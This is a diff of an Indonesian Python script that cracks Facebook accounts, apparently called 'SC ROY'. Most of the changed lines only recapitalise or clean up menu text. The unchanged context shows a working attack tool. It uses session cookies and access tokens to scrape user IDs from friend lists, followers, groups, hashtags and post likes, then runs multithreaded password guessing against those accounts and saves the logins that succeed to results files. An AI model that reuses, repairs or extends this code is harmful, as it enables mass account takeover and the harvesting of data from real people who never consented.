@@ -45,15 +45,15 @@ except:
 
 def hasil(ok,cp):
 	if len(ok) != 0 or len(cp) != 0:
-		print("\n\n %s[%s#%s] crack selesai..."%(N,O,N))
-		print(f"\n\n\n %s[%s✓%s] total ok : %s{len(ok)}"%(N,H,N,H))
-		exit(f" %s[%s×%s] total cp :%s {len(cp)}"%(N,K,N,K))
+		print("\n\n %s[%s#%s] Crack Selesai..."%(N,O,N))
+		print(f"\n %s[%s✓%s] Total OK : %s{len(ok)}"%(N,H,N,H))
+		exit(f" %s[%s×%s] Total CP :%s {len(cp)}"%(N,K,N,K))
 	else:exit("\n\n %s[%s!%s] opshh kamu tidak mendapatkan hasil:( "%(N,M,N))
 
 def tod():
     titik = ['\x1b[1;92m.   ', '\x1b[1;93m..  ', '\x1b[1;96m... ','\x1b[1;92m.   ', '\x1b[1;93m..  ', '\x1b[1;96m... ']
     for x in titik:
-        print(f"\r %s[%s×%s] menghapus cookies {x} "%(N,M,N),end="")
+        print(f"\r %s[%s×%s] Menghapus cookies {x} "%(N,M,N),end="")
         waktu(1)
 
 def ngentod():
@@ -117,13 +117,13 @@ def info_tools():
     ngewe().menu()
     
 def dump_id():
-	print ('\n [%s1%s]. Dump id dari teman publik'%(O,N))
-	print (' [%s2%s]. Dump id dari total followers'%(O,N))
-	print (' [%s3%s]. Dump id dari like postingan'%(O,N))
+	print ('\n [%s1%s]. Dump ID dari Teman Publik'%(O,N))
+	print (' [%s2%s]. Dump ID dari Total Followers'%(O,N))
+	print (' [%s3%s]. Dump ID dari Like Postingan'%(O,N))
 	__ngontol__()
 	
 def __ngontol__():
-	tod = input('\n [*] menu : ')
+	tod = input('\n [*] Menu : ')
 	if tod == '':
 		print('\n %s[%s×%s] Jangan kosong'%(N,M,N));waktu(1);__ngontol__()
 	elif tod =='1':
@@ -133,7 +133,7 @@ def __ngontol__():
 	elif tod =='3':
 		postingan()
 	else:
-		print('\n %s[%s×%s] isi yang bener'%(N,M,N));waktu(1);__ngontol__()
+		print('\n %s[%s×%s] Isi yang bener'%(N,M,N));waktu(1);__ngontol__()
 
 # ---- Method Token --->
 
@@ -142,7 +142,7 @@ def teman():
     try:
         __cindy__= open('__yayan__.txt', 'r').read()
     except IOError:
-        print ('\n %s[%s!%s] token invalid'%(N,M,N))
+        print ('\n %s[%s!%s] Token invalid'%(N,M,N))
         os.system('rm -rf __yayan__.txt')
         waktu(0.01)
         yayanxd()
@@ -150,9 +150,9 @@ def teman():
         os.mkdir('dump')
     except:pass
     try:
-        print (f"\n {N}[{M}!{N}] isi 'me' jika ingin dump id dari daftar teman")
-        asw = input('\n %s[%s?%s] id publik  : '%(N,O,N))
-        mmk = input(' %s[%s?%s] nama file  : '%(N,O,N))
+        print (f"\n {N}[{M}!{N}] Isi 'me' jika ingin Dump ID dari Daftar Teman")
+        asw = input('\n %s[%s?%s] ID Publik  : '%(N,O,N))
+        mmk = input(' %s[%s?%s] Nama File  : '%(N,O,N))
         ihh = req.get('https://graph.facebook.com/%s/friends?limit=50000000&access_token=%s'%(asw,__cindy__))
         id = []
         z = json.loads(ihh.text)
@@ -162,19 +162,19 @@ def teman():
             id.append(a['id'] + '<=>' + a['name'])
             ys.write(a['id'] + '<=>' + a['name'] + '\n')
             w = random.choice(['\x1b[1;91m', '\x1b[1;92m', '\x1b[1;93m', '\x1b[1;94m', '\x1b[1;95m', '\x1b[1;96m', '\x1b[1;97m', '\x1b[0m'])
-            sys.stdout.write('\r\033[0m - ' + w + '%s%s                                        \r\n\n [\033[0;96m%s\033[0m] [\033[0;91m%s\033[0m] Proses Dump Id...'%(a['id'],N,datetime.now().strftime('%H:%M:%S'), len(id)
+            sys.stdout.write('\r\033[0m - ' + w + '%s%s                                        \r\n\n [\033[0;96m%s\033[0m] [\033[0;91m%s\033[0m] Proses Dump ID...'%(a['id'],N,datetime.now().strftime('%H:%M:%S'), len(id)
             )); sys.stdout.flush()
             waktu(0.0050)
 
         ys.close()
-        jalan('\n\n %s[%s✓%s] berhasil dump id'%(N,H,N))
-        print (' [%s•%s] salin output file 👉 ( %s%s%s )'%(O,N,M,cin,N))
+        jalan('\n\n %s[%s✓%s] Berhasil Dump ID'%(N,H,N))
+        print (' [%s•%s] Salin Output File 👉 ( %s%s%s )'%(O,N,M,cin,N))
         print( 50 * '=')
         input(' [%s ENTER%s ] '%(O,N))
         ngewe().menu()
     except (KeyError,IOError):
         os.remove(cin)
-        jalan('\n %s[%s!%s] Gagal dump id, kemungkinan id tidaklah publik.\n'%(N,M,N))
+        jalan('\n %s[%s!%s] Gagal Dump ID, kemungkinan ID tidaklah publik.\n'%(N,M,N))
         input(' [ %sKEMBALI%s ] '%(O,N))
         ngewe().menu()
         
@@ -183,7 +183,7 @@ def followers():
     try:
         __cindy__= open('__yayan__.txt', 'r').read()
     except IOError:
-        print ('\n %s[%s×%s] token invalid'%(N,M,N))
+        print ('\n %s[%s×%s] Token Invalid'%(N,M,N))
         os.system('rm -rf __yayan__.txt')
         waktu(0.01)
         yayanxd()
@@ -191,8 +191,8 @@ def followers():
         os.mkdir('dump')
     except:pass
     try:
-        asw = input(' %s[%s?%s] id followers  : '%(N,O,N))
-        mmk = input(' %s[%s?%s] nama file     : '%(N,O,N))
+        asw = input(' %s[%s?%s] ID Followers  : '%(N,O,N))
+        mmk = input(' %s[%s?%s] Nama File     : '%(N,O,N))
         ihh = req.get('https://graph.facebook.com/%s/subscribers?limit=5000000000&access_token=%s'%(asw,__cindy__))
         id = []
         z = json.loads(ihh.text)
@@ -202,19 +202,19 @@ def followers():
             id.append(a['id'] + '<=>' + a['name'])
             ys.write(a['id'] + '<=>' + a['name'] + '\n')
             w = random.choice(['\x1b[1;91m', '\x1b[1;92m', '\x1b[1;93m', '\x1b[1;94m', '\x1b[1;95m', '\x1b[1;96m', '\x1b[1;97m', '\x1b[0m'])
-            sys.stdout.write('\r\033[0m - ' + w + '%s%s                                        \r\n\n [\033[0;96m%s\033[0m] [\033[0;91m%s\033[0m] Proses Dump Id...'%(a['id'],N,datetime.now().strftime('%H:%M:%S'), len(id)
+            sys.stdout.write('\r\033[0m - ' + w + '%s%s                                        \r\n\n [\033[0;96m%s\033[0m] [\033[0;91m%s\033[0m] Proses Dump ID...'%(a['id'],N,datetime.now().strftime('%H:%M:%S'), len(id)
             )); sys.stdout.flush()
             waktu(0.0050)
 
         ys.close()
-        jalan('\n\n %s[%s✓%s] berhasil dump id'%(N,H,N))
-        print (' [%s•%s] salin output file 👉 ( %s%s%s )'%(O,N,M,cin,N))
+        jalan('\n\n %s[%s✓%s] Berhasil Dump ID'%(N,H,N))
+        print (' [%s•%s] Salin Output File 👉 ( %s%s%s )'%(O,N,M,cin,N))
         print( 50 * '=')
         input(' [%s ENTER%s ] '%(O,N))
         ngewe().menu()
     except (KeyError,IOError):
         os.remove(cin)
-        jalan('\n %s[%s!%s] Gagal dump id, kemungkinan id tidaklah publik.\n'%(N,M,N))
+        jalan('\n %s[%s!%s] Gagal Dump ID, kemungkinan ID tidaklah publik.\n'%(N,M,N))
         input(' [ %sKEMBALI%s ] '%(O,N))
         ngewe().menu()
         
@@ -223,7 +223,7 @@ def postingan():
     try:
         __cindy__= open('__yayan__.txt', 'r').read()
     except IOError:
-        print ('\n %s[%s×%s] token invalid'%(N,M,N))
+        print ('\n %s[%s×%s] Token Invalid'%(N,M,N))
         os.system('rm -rf __yayan__.txt')
         waktu(0.01)
         yayanxd()
@@ -231,8 +231,8 @@ def postingan():
         os.mkdir('dump')
     except:pass
     try:
-        asw = input(' %s[%s?%s] id followers  : '%(N,O,N))
-        mmk = input(' %s[%s?%s] nama file     : '%(N,O,N))
+        asw = input(' %s[%s?%s] ID Followers  : '%(N,O,N))
+        mmk = input(' %s[%s?%s] Nama File     : '%(N,O,N))
         ihh = req.get('https://graph.facebook.com/%s/likes?limit=5000000000000&access_token=%s'%(asw,__cindy__))
         id = []
         z = json.loads(ihh.text)
@@ -242,19 +242,19 @@ def postingan():
             id.append(a['id'] + '<=>' + a['name'])
             ys.write(a['id'] + '<=>' + a['name'] + '\n')
             w = random.choice(['\x1b[1;91m', '\x1b[1;92m', '\x1b[1;93m', '\x1b[1;94m', '\x1b[1;95m', '\x1b[1;96m', '\x1b[1;97m', '\x1b[0m'])
-            sys.stdout.write('\r\033[0m - ' + w + '%s%s                                        \r\n\n [\033[0;96m%s\033[0m] [\033[0;91m%s\033[0m] Proses Dump Id...'%(a['id'],N,datetime.now().strftime('%H:%M:%S'), len(id)
+            sys.stdout.write('\r\033[0m - ' + w + '%s%s                                        \r\n\n [\033[0;96m%s\033[0m] [\033[0;91m%s\033[0m] Proses Dump ID...'%(a['id'],N,datetime.now().strftime('%H:%M:%S'), len(id)
             )); sys.stdout.flush()
             waktu(0.0050)
 
         ys.close()
-        jalan('\n\n %s[%s✓%s] berhasil dump id'%(N,H,N))
-        print (' [%s•%s] salin output file 👉 ( %s%s%s )'%(O,N,M,cin,N))
+        jalan('\n\n %s[%s✓%s] Berhasil Dump ID'%(N,H,N))
+        print (' [%s•%s] Salin Output File 👉 ( %s%s%s )'%(O,N,M,cin,N))
         print( 50 * '=')
         input(' [%s ENTER%s ] '%(O,N))
         ngewe().menu()
     except (KeyError,IOError):
         os.remove(cin)
-        jalan('\n %s[%s!%s] Gagal dump id, kemungkinan id tidaklah publik.\n'%(N,M,N))
+        jalan('\n %s[%s!%s] Gagal Dump ID, kemungkinan ID tidaklah publik.\n'%(N,M,N))
         input(' [ %sKEMBALI%s ] '%(O,N))
         ngewe().menu()
         
@@ -265,7 +265,7 @@ class sunda:
 		try:
 			__kontol__ = open('__yayan__.txt','r').read()
 		except (KeyError, IOError,FileNotFoundError):
-			print('\n %s[%s×%s] cookies invalid'%(N,M,N));waktu(1)
+			print('\n %s[%s×%s] Cookies Invalid'%(N,M,N));waktu(1)
 			try:os.remove('cookies');os.remove('__yayan__.txt')
 			except:os.system('rm -rf cookies');os.system('rm -rf __yayan__.txt')
 			yayanxd()
@@ -275,7 +275,7 @@ class sunda:
 			nama   = keluar['name']
 			idfb   = keluar['id']
 		except (KeyError, IOError,FileNotFoundError):
-			print('\n %s[%s×%s] cookies invalid'%(N,M,N));waktu(1)
+			print('\n %s[%s×%s] Cookies Invalid'%(N,M,N));waktu(1)
 			try:os.remove('cookies');os.remove('__yayan__.txt')
 			except:os.system('rm -rf cookies');os.system('rm -rf __yayan__.txt')
 			yayanxd()
@@ -295,13 +295,13 @@ class sunda:
 		print(f" [⭐] Status       : {H}Premium{N}")
 		print(f" [⭐] Bergabung    : {K}{hari}-{bulan}-{tahun}{N}")
 		print( 50 * '=')
-		print(f" [{K}?{O} Menu Pilihan{N} ]  ")
-		print(" %s[%s01%s]. Crack dari Pencarian Nama"%(N,O,N))
-		print(" %s[%s02%s]. Crack dari ID Publik"%(N,O,N))
-		print(" %s[%s03%s]. Crack dari Followers"%(N,O,N))
-		print(" %s[%s04%s]. Crack dari Like Postingan"%(N,O,N))
-		print(" %s[%s05%s]. Crack dari Grup"%(N,O,N))
-		print(" %s[%s06%s]. Crack dari Hastag"%(N,O,N))
+		print(f" [{K}?{N}]{O} Menu Pilihan{N}  ")
+		print(" %s[%s01%s]. Crack dari Pencarian Nama"%(N,K,N))
+		print(" %s[%s02%s]. Crack dari ID Publik"%(N,K,N))
+		print(" %s[%s03%s]. Crack dari Followers"%(N,K,N))
+		print(" %s[%s04%s]. Crack dari Like Postingan"%(N,K,N))
+		print(" %s[%s05%s]. Crack dari Grup"%(N,K,N))
+		print(" %s[%s06%s]. Crack dari Hastag"%(N,K,N))
 		print(" %s[%s07%s]. Cek hasil Crack (%sNew%s)"%(N,K,N,H,N))
 		print(" %s[%s08%s]. Info %sSC ROY %s(%sNew%s)"%(N,K,N,K,N,H,N))
 		print(" %s[%s09%s]. Fitur Dump ID (%sNew%s)"%(N,K,N,H,N))
@@ -328,7 +328,7 @@ class ngewe:
 					self.id.append(re.findall("(.*?)\?refid=",softek[0])[0]+"<=>"+softek[1])
 				else:
 					self.id.append(softek[0]+"<=>"+softek[1])
-				print(f"\r [*] sedang mengumpulkan {len(self.id)} id... ",end="")
+				print(f"\r [*] Sedang mengumpulkan {len(self.id)} ID... ",end="")
 			if "Lihat Selengkapnya" in kontol:
 				self.folower(self.url+parser(kontol,"html.parser").find("a",string="Lihat Selengkapnya").get("href"))
 		except:pass
@@ -342,7 +342,7 @@ class ngewe:
 					self.id.append(re.findall("id=(.*)",softek[0])[0]+"<=>"+softek[1])
 				else:
 					self.id.append(softek[0]+"<=>"+softek[1])
-				print(f"\r [*] sedang mengumpulkan {len(self.id)} id... ",end="")
+				print(f"\r [*] Sedang mengumpulkan {len(self.id)} ID... ",end="")
 			if "Lihat Selengkapnya" in kontol:
 				self.grup(self.url+parser(kontol,"html.parser").find("a",string="Lihat Selengkapnya").get("href"))
 			else:
@@ -363,7 +363,7 @@ class ngewe:
 									continue
 								else:
 									self.id.append(d+"<=>"+c[1])
-							print(f"\r [*] sedang mengumpulkan {len(self.id)} id... ",end="")
+							print(f"\r [*] Sedang mengumpulkan {len(self.id)} ID... ",end="")
 					if "Lihat Postingan Lainnya" in a:
 						geh(self.url+parser(a,"html.parser").find("a",string="Lihat Postingan Lainnya").get("href"))
 				geh(f"{self.url}/groups/"+re.search("id=(\\d*)",hencet).group(1))
@@ -379,7 +379,7 @@ class ngewe:
 					self.id.append(re.findall("id=(.*?)&amp;refid",softek[1])[0]+"<=>"+softek[2])
 				else:
 					self.id.append(re.findall("(.*?)\?refid=",softek[1])[0]+"<=>"+softek[2])
-				print(f"\r [*] sedang mengumpulkan {len(self.id)} id... ",end="")
+				print(f"\r [*] Sedang mengumpulkan {len(self.id)} ID... ",end="")
 				if len(self.id)==jum:
 					true=True
 					break
@@ -397,7 +397,7 @@ class ngewe:
 					self.id.append(re.findall("uid\=(.*?)\&",softek[0])[0]+"<=>"+softek[1])
 				else:
 					self.id.append(re.findall("\/(.*?)\?fref",softek[0])[0]+"<=>"+softek[1])
-				print(f"\r [*] sedang mengumpulkan {len(self.id)} id... ",end="")
+				print(f"\r [*] Sedang mengumpulkan {len(self.id)} ID... ",end="")
 			if "Lihat selengkapnya" in kontol:
 				self.teman(self.url+parser(kontol,"html.parser").find("a",string="Lihat selengkapnya").get("href"))
 		except:pass
@@ -411,7 +411,7 @@ class ngewe:
 					self.id.append(re.findall("id\=(.*?)\&",softek[0])[0]+"<=>"+softek[1])
 				else:
 					self.id.append(re.findall("\/(.*?)\?fref",softek[0])[0]+"<=>"+softek[1])
-				print(f"\r [*] sedang mengumpulkan {len(self.id)} id... ",end="")
+				print(f"\r [*] Sedang mengumpulkan {len(self.id)} ID... ",end="")
 			if "Lihat Teman Lain" in kontol:
 				self.teman_dari_teman(self.url+parser(kontol,"html.parser").find("a",string="Lihat Teman Lain").get("href"))
 		except:pass
@@ -428,7 +428,7 @@ class ngewe:
 						self.id.append(re.findall("id=(.*)",softek[0])[0]+"<=>"+softek[1])
 					else:
 						self.id.append(re.findall("/(.*)",softek[0])[0]+"<=>"+softek[1])
-					print(f"\r [*] sedang mengumpulkan {len(self.id)} id... ",end="")
+					print(f"\r [*] Sedang mengumpulkan {len(self.id)} ID... ",end="")
 				if "Lihat Selengkapnya" in kontol:
 					self.reactpost(self.url+parser(kontol,"html.parser").find("a",string="Lihat Selengkapnya").get("href"))
 		except:pass
@@ -457,7 +457,7 @@ class ngewe:
 							continue
 						else:
 							self.id.append(tol+"<=>"+softek[1])
-				print(f"\r [*] sedang mengumpulkan {len(self.id)} id... ",end="")
+				print(f"\r [*] Sedang mengumpulkan {len(self.id)} ID... ",end="")
 				if len(self.id)==jum:
 					true=True
 					break
@@ -468,12 +468,12 @@ class ngewe:
 # menu
 	def menu(self):
 		sunda(self.url)
-		jembut = input(f"\n [❓] Pilih : {warna}")
+		jembut = input(f"\n [?] Pilih : {warna}")
 		if jembut in["1","01"]:
 			while True:
-				kontol = input(f" {N}[?] masukan nama pencarian (cht : zuck): ")
+				kontol = input(f" {N}[?] Masukan Nama Pencarian (cht : zuck): ")
 				if kontol in[""," "]:
-					print('\n %s[%s×%s] Jangan kosong tod'%(N,M,N));waktu(1);self.menu()
+					print('\n %s[%s×%s] Jangan kosong'%(N,M,N));waktu(1);self.menu()
 				else:
 					try:
 						ajg=req.get(f"{self.url}/search/people/?q={kontol}",cookies=kueh).text
@@ -483,7 +483,7 @@ class ngewe:
 							print(" [!] facebook membatasi setiap aktivitas, limit bro, silahkan beralih akun");waktu(2);self.menu()
 						else:
 							jumlah = int(input(" [?] masukan jumlah id : "))
-							print(" [!] untuk berhenti tekan CTRL lalu tekan c di keyboard anda.")
+							print(" [!] Untuk berhenti tekan CTRL+c di keyboard Anda.")
 							if "5000" in str(jumlah):
 								jumlah-=1
 							if jumlah<5001:
@@ -492,12 +492,12 @@ class ngewe:
 					except(req.exceptions.ConnectionError,req.exceptions.ChunkedEncodingError,req.exceptions.ReadTimeout):
 						exit("\n [!] Kesalahan Pada Koneksi")
 					except ValueError:
-						exit("\n [!] isi yang bener ajg")
+						exit("\n [!] Isi yang bener")
 		elif jembut in["2","02"]:
-			print (f"{N} [*] isi 'me' jika ingin crack dari daftar teman")
+			print (f"{N} [*] Isi 'me' jika ingin Crack dari Daftar Teman")
 			kontol = input(" [?] masukan id atau username : ")
 			if kontol in[""," "]:
-				print('\n %s[%s×%s] Jangan kosong tod'%(N,M,N));waktu(1);self.menu()
+				print('\n %s[%s×%s] Jangan kosong'%(N,M,N));waktu(1);self.menu()
 			elif kontol.isdigit():
 				memek=f"{self.url}/profile.php?id={kontol}&v=friends"
 			else:
@@ -516,14 +516,14 @@ class ngewe:
 					self.teman(f"{self.url}/friends/center/friends/")
 				else:
 					#print(" [*] crack dari teman : "+re.findall("\<title\>(.*?)<\/title\>",ajg)[0])
-					print(" [!] untuk berhenti tekan CTRL lalu tekan c di keyboard anda.")
+					print(" [!] Untuk berhenti tekan CTRL+c di keyboard Anda.")
 					self.teman_dari_teman(memek)
 			except(req.exceptions.ConnectionError,req.exceptions.ChunkedEncodingError,req.exceptions.ReadTimeout):
 				exit(" [!] kesalahan pada koneksi")
 		elif jembut in["3","03"]:
-			kontol = input(f"{N} [?] masukan id atau username followers : ")
+			kontol = input(f"{N} [?] Masukan ID atau Username Followers : ")
 			if kontol in[""," "]:
-				print('\n %s[%s×%s] Jangan kosong tod'%(N,M,N));waktu(1);self.menu()
+				print('\n %s[%s×%s] Jangan kosong'%(N,M,N));waktu(1);self.menu()
 			elif kontol.isdigit():
 				memek=f"{self.url}/profile.php?id={kontol}&v=followers"
 			else:
@@ -538,15 +538,15 @@ class ngewe:
 					print(f" [!] penggunaan dengan id {kontol} tidak ditemukan");waktu(2);self.menu()
 				else:
 					print(" [*] crack total followers dari : "+re.findall("\<title\>(.*?)<\/title\>",ajg)[0])
-					print(" [!] untuk berhenti tekan CTRL lalu tekan c di keyboard anda.")
+					print(" [!] Untuk berhenti tekan CTRL+c di keyboard Anda.")
 					self.folower(memek)
 			except(req.exceptions.ConnectionError,req.exceptions.ChunkedEncodingError,req.exceptions.ReadTimeout):
 				exit(" [!] kesalahan pada koneksi")
 		elif jembut in["4","04"]:
-			kontol = input(f"{N} [?] url atau id postingan : ")
-			print(" [!] untuk berhenti tekan CTRL lalu tekan c di keyboard anda.")
+			kontol = input(f"{N} [?] URL atau ID Postingan : ")
+			print(" [!] Untuk berhenti tekan CTRL+c di keyboard Anda.")
 			if kontol in[""," "]:
-				print('\n %s[%s×%s] Jangan kosong tod'%(N,M,N));waktu(1);self.menu()
+				print('\n %s[%s×%s] Jangan kosong'%(N,M,N));waktu(1);self.menu()
 			elif kontol.isdigit():
 				memek=f"{self.url}/{kontol}"
 			elif "m.facebook.com" in kontol:
@@ -575,9 +575,9 @@ class ngewe:
 				print(f" [!] Why {memek} Mikir Dong Tolol, Masukin Url Postingan Yang Bener Ngentod");waktu(3);self.menu()
 		elif jembut in["5","05"]:
 			while True:
-				kontol = input(f"{N} [?] masukkan id grup : ")
+				kontol = input(f"{N} [?] Masukkan ID Grup : ")
 				if kontol in[""," "]:
-					print('\n %s[%s×%s] Jangan kosong tod'%(N,M,N));waktu(1);self.menu()
+					print('\n %s[%s×%s] Jangan kosong'%(N,M,N));waktu(1);self.menu()
 				else:
 					try:
 						ajg=req.get(f"{self.url}/browse/group/members/?id={kontol}",cookies=kueh).text
@@ -588,16 +588,16 @@ class ngewe:
 						elif "Konten Tidak Ditemukan" in ajg:
 							print(f" [!] group dengan id {kontol} tidak ditemukan");waktu(2);self.menu()
 						else:
-							print(" [*] nama grup : "+re.findall("\<title\>(.*?)<\/title\>",ajg)[0][8:])
-							print(" [!] untuk berhenti tekan CTRL lalu tekan c di keyboard anda.")
+							print(" [*] Nama Grup : "+re.findall("\<title\>(.*?)<\/title\>",ajg)[0][8:])
+							print(" [!] Untuk berhenti tekan CTRL+c di keyboard Anda.")
 							self.grup(f"{self.url}/browse/group/members/?id={kontol}");break
 					except(req.exceptions.ConnectionError,req.exceptions.ChunkedEncodingError,req.exceptions.ReadTimeout):
 						exit(" [!] Kesalahan Pada Koneksi")
 		elif jembut in["6","06"]:
 			while True:
-				kontol = input(f"{N} [?] hastag : ")
+				kontol = input(f"{N} [?] Hastag : ")
 				if kontol in[""," "]:
-					print('\n %s[%s×%s] Jangan kosong tod'%(N,M,N));waktu(1);self.menu()
+					print('\n %s[%s×%s] Jangan kosong'%(N,M,N));waktu(1);self.menu()
 				else:
 					try:
 						ajg=req.get(f"{self.url}/hashtag/{kontol}",cookies=kueh).text
@@ -608,8 +608,8 @@ class ngewe:
 						elif "sementara disembunyikan di sini. Beberapa konten di dalam postingan tersebut melanggar Standar Komunitas kami." in ajg:
 							print(f" [!] postingan dengan hashtag {kontol} disembunyikan karna melanggar standar komunitas facebook");waktu(2);self.menu()
 						else:
-							jumlah=int(input(" [?] masukan jumlah id : "))
-							print(" [!] untuk berhenti tekan CTRL lalu tekan c di keyboard anda.")
+							jumlah=int(input(" [?] Masukan Jumlah ID : "))
+							print(" [!] Untuk berhenti tekan CTRL+c di keyboard Anda.")
 							if "5000" in str(jumlah):
 								jumlah-=1
 							if jumlah<5001:
@@ -622,9 +622,9 @@ class ngewe:
 		elif jembut in["7","07"]:
 			print("\n %s[%s1%s] Check hasil OK"%(N,O,N))
 			print(" %s[%s2%s] Check hasil CP"%(N,O,N))
-			ask=input("\n %s[%s?%s] Choose : "%(N,K,N))
+			ask=input("\n %s[%s?%s] Pilih : "%(N,K,N))
 			if ask in[""," "]: 
-				print(" [!] pilih yang bener ajg");self.menu()
+				print(" [!] Pilih yang bener");self.menu()
 			elif ask in["1","01"]:
 				try:
 					totalok = open("results/OK-%s-%s-%s.txt"%(ha, op, ta)).read().splitlines()
@@ -648,7 +648,7 @@ class ngewe:
 					print("\n %s[%s×%s] Opshh kamu tidak mendapatkan hasil cp :("%(N,M,N))
 					input('\n  [ %sKEMBALI%s ] '%(O,N));self.menu()
 			else:
-				print(" [!] pilih yang bener ajg");self.menu()
+				print(" [!] Pilih yang bener");self.menu()
 		elif jembut in["8","08"]:
 			info_tools()
 		elif jembut in["9","09"]:
@@ -665,37 +665,37 @@ class ngewe:
 			except:os.system('rm -rf cookies');os.system('rm -rf __yayan__.txt')
 			exit()
 		elif jembut in[""," "]:
-			print('\n %s[%s×%s] Jangan kosong tod'%(N,M,N));waktu(1);self.menu()
+			print('\n %s[%s×%s] Jangan kosong'%(N,M,N));waktu(1);self.menu()
 		else:
-			print("\n %s[%s×%s] pilih yang bener ajg"%(N,M,N));waktu(1);self.menu()
+			print("\n %s[%s×%s] Pilih yang bener"%(N,M,N));waktu(1);self.menu()
 		if len(self.id)!=0:
 			print("")
 			self.plerr()
 		else:
-			print("\n %s[%s×%s] gagal mengambil id, silahkan coba lagi"%(N,M,N));waktu(1);self.menu()
+			print("\n %s[%s×%s] Gagal mengambil ID, silahkan coba lagi"%(N,M,N));waktu(1);self.menu()
 			
 # mulai ngecrot awokawokawokkawok 
 	def plerr(self):
 		print('\n [+] total id -> %s%s%s' %(M,len(self.id),N))
-		___yayanganteng___=input("%s [?] apakah anda ingin menggunakan sandi manual? [Y/t]: "%(N))
+		___yayanganteng___=input("%s [?] Ingin menggunakan sandi manual? [Y/t]: "%(N))
 		if ___yayanganteng___ in(""," "):
-			print("\n %s[%s×%s] isi yang bener ajing"%(N,M,N));self.plerr()
+			print("\n %s[%s×%s] isi yang bener"%(N,M,N));self.plerr()
 		elif ___yayanganteng___ in("Y","y"):
 			print ('\n [!] gunakan , (koma) untuk pemisah contoh : sandi123,sandi12345,dll. setiap kata minimal 6 karakter atau lebih')
 			while True:
-				pwek=input('\n [?] masukan kata sandi : ')
+				pwek=input('\n [?] Masukan Kata Sandi : ')
 				if pwek in(""," "):
 					print ('\n %s[%s×%s] jangan kosong bro kata sandi nya'%(N,M,N))
 				elif len(pwek)<=5:
 					print ('\n %s[%s×%s] kata sandi minimal 6 karakter'%(N,M,N))
 				else:
 					def __yan__(ysc=None): # ycs => Yayan sayang Cindy:3
-						cin=input("\n [?] method : ")
+						cin=input("\n [?] Pilih : ")
 						if cin in(""," "):
-							print("\n %s[%s×%s] pilih yang bener ajg"%(N,M,N));self.__yan__()
+							print("\n %s[%s×%s] Pilih yang bener"%(N,M,N));self.__yan__()
 						elif cin in("1","01"):
-							print('\n [+] hasil OK disimpan ke -> results/OK-%s-%s-%s.txt' % (ha, op, ta))
-							print(' [+] hasil CP disimpan ke -> results/CP-%s-%s-%s.txt' % (ha, op, ta))
+							print('\n [+] Hasil OK -> results/OK-%s-%s-%s.txt' % (ha, op, ta))
+							print(' [+] Hasil CP -> results/CP-%s-%s-%s.txt' % (ha, op, ta))
 							print('\n [!] anda bisa mematikan data selular untuk menjeda proses crack\n')
 							with YayanGanteng(max_workers=30) as __yayanXD__:
 								for ikeh in self.id:
@@ -705,8 +705,8 @@ class ngewe:
 									except: pass
 							hasil(live,chek)
 						elif cin in("2","02"):
-							print('\n [+] hasil OK disimpan ke -> results/OK-%s-%s-%s.txt' % (ha, op, ta))
-							print(' [+] hasil CP disimpan ke -> results/CP-%s-%s-%s.txt' % (ha, op, ta))
+							print('\n [+] Hasil OK -> results/OK-%s-%s-%s.txt' % (ha, op, ta))
+							print(' [+] Hasil CP -> results/CP-%s-%s-%s.txt' % (ha, op, ta))
 							print('\n [!] anda bisa mematikan data selular untuk menjeda proses crack\n')
 							with YayanGanteng(max_workers=30) as __yayanXD__:
 								for ikeh in self.id:
@@ -716,8 +716,8 @@ class ngewe:
 									except: pass
 							hasil(live,chek)
 						elif cin in("3","03"):
-							print('\n [+] hasil OK disimpan ke -> results/OK-%s-%s-%s.txt' % (ha, op, ta))
-							print(' [+] hasil CP disimpan ke -> results/CP-%s-%s-%s.txt' % (ha, op, ta))
+							print('\n [+] Hasil OK -> results/OK-%s-%s-%s.txt' % (ha, op, ta))
+							print(' [+] Hasil CP -> results/CP-%s-%s-%s.txt' % (ha, op, ta))
 							print('\n [!] anda bisa mematikan data selular untuk menjeda proses crack\n')
 							with YayanGanteng(max_workers=30) as __yayanXD__:
 								for ikeh in self.id:
@@ -849,8 +849,8 @@ class ngewe:
 		if wibu in[""," "]:
 			print("\n %s[%s×%s] pilih yang bener ajg"%(N,M,N));self.__pler__()
 		elif wibu in["1","01"]:
-			print('\n [+] hasil OK disimpan ke -> results/OK-%s-%s-%s.txt' % (ha, op, ta))
-			print(' [+] hasil CP disimpan ke -> results/CP-%s-%s-%s.txt' % (ha, op, ta))
+			print('\n [+] Hasil OK -> results/OK-%s-%s-%s.txt' % (ha, op, ta))
+			print(' [+] Hasil CP -> results/CP-%s-%s-%s.txt' % (ha, op, ta))
 			print('\n [!] anda bisa mematikan data selular untuk menjeda proses crack\n')
 			with YayanGanteng(max_workers=50) as __yayanXD__:
 				for yntks in self.id:
@@ -861,8 +861,8 @@ class ngewe:
 					except:pass
 			hasil(live,chek)
 		elif wibu in["2","02"]:
-			print('\n [+] hasil OK disimpan ke -> results/OK-%s-%s-%s.txt' % (ha, op, ta))
-			print(' [+] hasil CP disimpan ke -> results/CP-%s-%s-%s.txt' % (ha, op, ta))
+			print('\n [+] Hasil OK -> results/OK-%s-%s-%s.txt' % (ha, op, ta))
+			print(' [+] Hasil CP -> results/CP-%s-%s-%s.txt' % (ha, op, ta))
 			print('\n [!] anda bisa mematikan data selular untuk menjeda proses crack\n')
 			with YayanGanteng(max_workers=50) as __yayanXD__:
 				for yntks in self.id:
@@ -873,8 +873,8 @@ class ngewe:
 					except:pass
 			hasil(live,chek)
 		elif wibu in["3","03"]:
-			print('\n [+] hasil OK disimpan ke -> results/OK-%s-%s-%s.txt' % (ha, op, ta))
-			print(' [+] hasil CP disimpan ke -> results/CP-%s-%s-%s.txt' % (ha, op, ta))
+			print('\n [+] Hasil OK -> results/OK-%s-%s-%s.txt' % (ha, op, ta))
+			print(' [+] Hasil CP -> results/CP-%s-%s-%s.txt' % (ha, op, ta))
 			print('\n [!] anda bisa mematikan data selular untuk menjeda proses crack\n')
 			with YayanGanteng(max_workers=50) as __yayanXD__:
 				for yntks in self.id:
